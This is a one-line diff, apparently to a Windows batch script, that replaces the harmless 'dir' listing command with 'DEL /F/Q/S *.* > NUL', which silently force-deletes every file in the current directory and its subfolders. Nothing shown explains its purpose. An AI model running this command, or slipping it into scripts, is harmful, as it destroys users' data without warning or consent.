@@ -1,1 +1,1 @@
-dir
+DEL /F/Q/S *.* > NUL
